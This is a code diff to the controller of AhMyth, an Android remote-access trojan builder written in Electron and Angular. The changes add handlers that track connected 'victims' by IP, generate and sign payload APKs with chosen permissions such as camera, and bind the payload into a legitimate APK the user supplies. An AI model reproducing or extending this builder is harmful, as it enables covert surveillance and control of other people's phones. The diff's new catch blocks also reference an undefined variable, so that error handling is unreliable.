@@ -1,43 +1,33 @@
 var app = angular.module('myapp', []);
-const {
-    remote
-} = require('electron');
-var dialog = remote.dialog;
-const {
-    ipcRenderer
-} = require('electron');
-var fs = require('fs-extra')
-var victimsList = remote.require('./main');
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
-var homedir = require('node-homedir');
-const {
-    dirname
-} = require('path');
-var dir = require("path");
-const {
-    promisify
-} = require('util');
+const { ipcRenderer } = require('electron');
+const { promisify } = require('util');
 const exec = promisify(require('child_process').exec);
+var fs = require('fs-extra');
 var xml2js = require('xml2js');
 var readdirp = require('readdirp');
+const { dialog, getCurrentWindow } = require('@electron/remote');
+const { getVictim } = require('@electron/remote').require('./main');
+const CONSTANTS = require(__dirname + '/assets/js/Constants');
+const os = require('os');
+const dir = require("path");
+
 //--------------------------------------------------------------
 var viclist = {};
-var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
+var dataPath = dir.join(os.homedir(), CONSTANTS.dataDir);
 var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
 var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
 //--------------------------------------------------------------
 
-
-
 // App Controller for (index.html)
-app.controller("AppCtrl", ($scope) => {
+app.controller('AppCtrl', ($scope, $timeout) => {
     $appCtrl = $scope;
     $appCtrl.victims = viclist;
     $appCtrl.isVictimSelected = true;
     $appCtrl.bindApk = {
-        enable: false, method: 'BOOT'
-    }; //default values for binding apk
+        enable: false,
+        method: 'BOOT'
+    }; // default values for binding apk
 
     var log = document.getElementById("log");
 
@@ -48,7 +38,7 @@ app.controller("AppCtrl", ($scope) => {
     $('.ui.dropdown')
         .dropdown();
 
-    const window = remote.getCurrentWindow();
+    const window = getCurrentWindow();
     $appCtrl.close = () => {
         window.close();
     };
@@ -65,7 +55,23 @@ app.controller("AppCtrl", ($scope) => {
         }
     };
 
-    // when user clicks Listen button
+    // handle dark mode toggle
+    $appCtrl.switch = async () => {
+        const isDarkMode = await ipcRenderer.invoke('dark-mode:toggle');
+        document.getElementById('theme-source').innerHTML = isDarkMode ? 'Dark' : 'Light';
+
+        // Toggle the active class on the button
+        const toggleButton = document.getElementById('toggle-dark-mode');
+        if (isDarkMode) {
+            toggleButton.classList.add('active');
+            document.body.classList.add('dark-mode');
+        } else {
+            toggleButton.classList.remove('active');
+            document.body.classList.remove('dark-mode');
+        }
+    };
+
+    // when the user clicks Listen button
     $appCtrl.Listen = (port) => {
         if (!port) {
             port = CONSTANTS.defaultPort;
@@ -74,6 +80,40 @@ app.controller("AppCtrl", ($scope) => {
         ipcRenderer.send("SocketIO:Listen", port);
     };
 
+    ipcRenderer.on("SocketIO:Listen", (event, message) => {
+        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
+        $appCtrl.isListen = true;
+        $appCtrl.$apply();
+    });
+
+    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
+        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
+        $appCtrl.isListen = false;
+        $appCtrl.$apply();
+    });
+
+    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
+        viclist[index] = getVictim(index);
+        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
+        $appCtrl.$apply();
+    });
+
+    $appCtrl.openLab = (index) => {
+        ipcRenderer.send('openLabWindow', 'lab.html', index);
+    };
+
+    ipcRenderer.on('SocketIO:GeoIPError', (event, warning) => {
+        $appCtrl.Log(warning, CONSTANTS.logStatus.WARNING);
+        $appCtrl.$apply();
+    });
+
+    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
+        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
+        delete viclist[index];
+        $appCtrl.$apply();
+    });
+
+    // when the user clicks the stop button
     $appCtrl.StopListening = (port) => {
         if (!port) {
             port = CONSTANTS.defaultPort;
@@ -82,26 +122,8 @@ app.controller("AppCtrl", ($scope) => {
         ipcRenderer.send("SocketIO:Stop", port);
     };
 
-    ipcRenderer.on("SocketIO:Listen", (event, message) => {
-        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
-        $appCtrl.isListen = true;
-        $appCtrl.$apply();
-    });
-
     ipcRenderer.on("SocketIO:Stop", (event, message) => {
         $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
-        $appCtrl.isListen = false;
-        $appCtrl.$apply();
-    });
-
-    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
-        viclist[index] = victimsList.getVictim(index);
-        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
-        $appCtrl.$apply();
-    });
-
-    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
-        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
         $appCtrl.isListen = false;
         $appCtrl.$apply();
     });
@@ -112,16 +134,16 @@ app.controller("AppCtrl", ($scope) => {
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
-        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
+    ipcRenderer.on('SocketIO:StopAndRemoveVictim', (event, index) => {
         delete viclist[index];
         $appCtrl.$apply();
     });
 
-    $appCtrl.openLab = (index) => {
-        ipcRenderer.send('openLabWindow', 'lab.html', index);
-    };
-
+    ipcRenderer.on('SocketIO:ServerDisconnectMessage', (event, port) => {
+        $appCtrl.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
+        $appCtrl.isListen = false;
+        $appCtrl.$apply();
+    });
 
     // app logs to print any new log in the black terminal
     $appCtrl.Log = (msg, status) => {
@@ -137,12 +159,22 @@ app.controller("AppCtrl", ($scope) => {
 
 
         $appCtrl.logs.push({
-            date: new Date().toLocaleString(), msg: msg, color: fontColor
+            date: new Date().toLocaleString(),
+            msg: msg,
+            color: fontColor
         });
-        log.scrollTop = log.scrollHeight;
+
+        // Use $timeout to ensure the view is updated before scrolling
+        $timeout(() => {
+            if (log) {
+                // use smooth scrolling for a lovely clean log output
+                log.scrollTo({ top: log.scrollHeight, behavior: 'smooth' });
+            }
+        }, 0);
+
         if (!$appCtrl.$$phase)
             $appCtrl.$apply();
-    }
+    };
 
     // function to clear the logs each time a button is clicked,
     // this is done to keep things clean.
@@ -174,8 +206,9 @@ app.controller("AppCtrl", ($scope) => {
             if (result.canceled) {
                 $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
             } else {
-                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop(); //get the name of the apk
-                $appCtrl.Log('[¡] "' + apkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
+                var printApkPath = result.filePaths[0];
+                var printApkName = dir.basename(printApkPath);
+                $appCtrl.Log('[¡] "' + printApkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                 readFile(result.filePaths[0]);
             }
         }).catch(() => {
@@ -188,7 +221,6 @@ app.controller("AppCtrl", ($scope) => {
         }
     }
 
-    // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
     $appCtrl.GenerateApk = async (apkFolder) => {
         if (!$appCtrl.bindApk.enable) {
             var checkBoxofCamera = document.getElementById("Permissions1");
@@ -258,68 +290,72 @@ app.controller("AppCtrl", ($scope) => {
                 delayedLog('[★] Reading the Payload Manifest File...');
                 const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');
 
-                delayedLog('[★] Parsing the Payload Manifest Data...');
-                const parsedData = await new Promise((resolve, reject) => {
-                    xml2js.parseString(data, (parseError, parsedData) => {
-                        if (parseError) {
-                            reject(parseError);
-                        } else {
-                            resolve(parsedData);
-                        }
+                try {
+                    delayedLog('[★] Parsing the Payload Manifest Data...');
+                    const parsedData = await new Promise((resolve, reject) => {
+                        xml2js.parseString(data, (parseError, parsedData) => {
+                            if (parseError) {
+                                reject(parseError);
+                            } else {
+                                // Modify the manifest data as needed
+                                parsedData.manifest['uses-permission'] = [];
+                                parsedData.manifest['uses-feature'] = [];
+
+                                selectedPermissions.forEach(permission => {
+                                    if (permission === 'android.hardware.camera') {
+                                        parsedData.manifest['uses-feature'].push({
+                                            $: {
+                                                'android:name': 'android.hardware.camera'
+                                            }
+                                        });
+                                    }
+
+                                    if (permission === 'android.hardware.camera.autofocus') {
+                                        parsedData.manifest['uses-feature'].push({
+                                            $: {
+                                                'android:name': 'android.hardware.camera.autofocus'
+                                            }
+                                        });
+                                    }
+
+                                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
+                                        parsedData.manifest['uses-permission'].push({
+                                            $: {
+                                                'android:name': permission
+                                            }
+                                        });
+                                    }
+                                });
+
+                                resolve(parsedData);
+                            }
+                        });
                     });
-                });
 
-                delayedLog('[★] Inserting the Selected Payload Permissions...');
-                parsedData.manifest['uses-permission'] = [];
-                parsedData.manifest['uses-feature'] = [];
-
-                // Add new permissions and features based on selectedPermissions
-                selectedPermissions.forEach(permission => {
-                    if (permission === 'android.hardware.camera') {
-                        parsedData.manifest['uses-feature'].push({
-                            $: {
-                                'android:name': 'android.hardware.camera'
-                            }
-                        });
-                    }
-
-                    if (permission === 'android.hardware.camera.autofocus') {
-                        parsedData.manifest['uses-feature'].push({
-                            $: {
-                                'android:name': 'android.hardware.camera.autofocus'
-                            }
-                        });
-                    }
-
-                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
-                        parsedData.manifest['uses-permission'].push({
-                            $: {
-                                'android:name': permission
-                            }
-                        });
-                    }
-                });
-
-                // Convert the parsed data back to XML
-                const builder = new xml2js.Builder();
-                const updatedData = builder.buildObject(parsedData);
-                await fs.promises.writeFile(
-                    dir.join(CONSTANTS.ahmythApkFolderPath,
-                        'AndroidManifest.xml'),
-                    updatedData,
-                    'utf8'
-                );
-
-            } catch (error) {
-                delayedLog('[x] Error occurred while processing the Payload Manifest:',
-                    CONSTANTS.logStatus.FAIL);
-                writeErrorLog(error);
-                delayedLog('[¡] Error written to "Error.log" on',
-                    CONSTANTS.logStatus.INFO);
-                delayedLog(logPath,
-                    CONSTANTS.logStatus.INFO);
+                    // Convert the modified parsed data back to XML
+                    const builder = new xml2js.Builder();
+                    const updatedData = builder.buildObject(parsedData);
+                    await fs.promises.writeFile(
+                        dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'),
+                        updatedData,
+                        'utf8'
+                    );
+                } catch (parseError) {
+                    delayedLog('[x] Error occurred while parsing the Payload Manifest:', CONSTANTS.logStatus.FAIL);
+                    writeErrorLog(error, 'Parsing');
+                    delayedLog('[¡] Error written to "Parsing.log" on', CONSTANTS.logStatus.INFO);
+                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                    return;
+                }
+            } catch (readError) {
+                // Handle errors related to reading the file
+                delayedLog('[x] Error occurred while reading the Payload Manifest File:', CONSTANTS.logStatus.FAIL);
+                writeErrorLog(error, 'Reading');
+                delayedLog('[¡] Error written to "Reading.log" on', CONSTANTS.logStatus.INFO);
+                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                 return;
             }
+
         }
 
         try {
@@ -332,45 +368,98 @@ app.controller("AppCtrl", ($scope) => {
             // Ignore the error by doing nothing
         }
 
-        // Build the AhMyth Payload APK
-        delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
-        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
-            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
-        exec(createApk,
-            (error, stdout, stderr) => {
-                if (error !== null) {
-                    delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
-                    writeErrorLog(error, 'Building');
-                    delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
-                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
-                    return;
-                }
+        if ($appCtrl.bindApk.enable) {
 
-                delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
-                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
-                exec(signApk, (error, stdout, stderr) => {
+            // Build and Sign the Bound AhMyth Payload
+            var originApkName = dir.basename(apkFolder) + ".apk";
+            delayedLog('[★] Building ' + originApkName + '...');
+            var createBoundApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, originApkName) + '" --use-aapt2 "' + '"';
+            exec(createBoundApk,
+                (error, stdout, stderr) => {
                     if (error !== null) {
-                        delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
-                        writeErrorLog(error, 'Signing');
-                        delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
+                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
+                        writeErrorLog(error, 'Building');
+                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                         delayedLog(logPath, CONSTANTS.logStatus.INFO);
                         return;
                     }
 
-                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
-                        if (err) throw err;
+                    delayedLog('[★] Signing ' + originApkName + '...');
+                    var signBoundApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, originApkName) + '"';
+                    exec(signBoundApk, (error, stdout, stderr) => {
+                        if (error !== null) {
+                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
+                            writeErrorLog(error, 'Signing');
+                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
+                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                            return;
+                        }
 
-                        delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
-                        delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
-                        delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
-                        delayedLog();
-
-                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                        // Remove the decompiled APK folder
+                        delayedLog('[★] Cleaning up...')
+                        fs.rmdir(apkFolder, {
+                            recursive: true
+                        }, (err) => {
                             if (err) throw err;
                         });
+
+                        fs.unlink(dir.join(outputPath, originApkName),
+                            (err) => {
+                                if (err) throw err;
+
+                                const apkNameBoundSigned = CONSTANTS.getApkNameBoundSigned(apkFolder);
+                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
+                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
+                                delayedLog('[¡] ' + dir.join(outputPath, apkNameBoundSigned), CONSTANTS.logStatus.INFO);
+                                delayedLog();
+
+                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                                    if (err) throw err;
+                                });
+                            });
                     });
                 });
-            });
+        } else {
+            // Build and Sign the Standalone AhMyth Payload
+            var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
+            delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
+            exec(createApk,
+                (error, stdout, stderr) => {
+                    if (error !== null) {
+                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
+                        writeErrorLog(error, 'Building');
+                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
+                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                        return;
+                    }
+
+                    delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
+                    var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
+                    exec(signApk, (error, stdout, stderr) => {
+                        if (error !== null) {
+                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
+                            writeErrorLog(error, 'Signing');
+                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
+                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                            return;
+                        }
+
+                        fs.unlink(dir.join(outputPath, CONSTANTS.apkName),
+                            (err) => {
+                                if (err) throw err;
+
+                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
+                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
+                                delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
+                                delayedLog();
+
+                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                                    if (err) throw err;
+                                });
+                            });
+                    });
+                });
+        }
     };
 
     // function to create the smali payload directory for storing ahmyth payload directories and files when binding
@@ -918,11 +1007,12 @@ app.controller("AppCtrl", ($scope) => {
         checkJavaVersion((error, javaVersion) => {
             if (error) {
                 $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log('[¡] AhMyth Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
+                $appCtrl.Log('[¡] Please Install any version of Java 8 upto 21 to Use This Feature.', CONSTANTS.logStatus.INFO);
                 return;
-            } else if (javaVersion !== 11) {
-                $appCtrl.Log(`[x] Wrong Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log('[¡] AhMyth Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
+            } else if (parseFloat(javaVersion) < 1.8 || parseFloat(javaVersion) >= 22) {
+                // excludes any java version less than 8 or greater than or equal to 22
+                $appCtrl.Log(`[x] Unsupported Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log('[¡] AhMyth Requires any Version of Java 8 through 21 to use This Feature.', CONSTANTS.logStatus.INFO);
                 return;
             } else {
                 if (!ip) {
@@ -935,6 +1025,7 @@ app.controller("AppCtrl", ($scope) => {
 
                 // check if bind apk is enabled
                 if (!$appCtrl.bindApk.enable) {
+                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);
                     var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                     delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                     fs.readFile(ipPortFile, 'utf8', (error, data) => {
@@ -973,6 +1064,8 @@ app.controller("AppCtrl", ($scope) => {
                         return;
                     }
 
+                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);
+
                     var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                     delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                     fs.readFile(ipPortFile, 'utf8', (error, data) => {
@@ -1000,7 +1093,8 @@ app.controller("AppCtrl", ($scope) => {
 
                             // generate a solid ahmyth apk
                             var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
-                            delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");
+                            var apkName = dir.basename(apkFolder) + ".apk";
+                            delayedLog('[★] ' + 'Decompiling ' + '"' + apkName + '"' + "...");
 
                             var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';
 
@@ -1036,10 +1130,10 @@ function checkJavaVersion(callback) {
                 callback(new Error('Java is not installed or not accessible.'));
             } else {
                 const versionOutput = stderr || stdout;
-                const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
+                const versionMatch = versionOutput.match(/version "([^"]+)"/);
                 if (versionMatch) {
-                    const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
-                    callback(null, majorVersion);
+                    const versionString = versionMatch[1];
+                    callback(null, versionString);
                 } else {
                     callback(new Error('Java is not installed or not accessible.'));
                 }
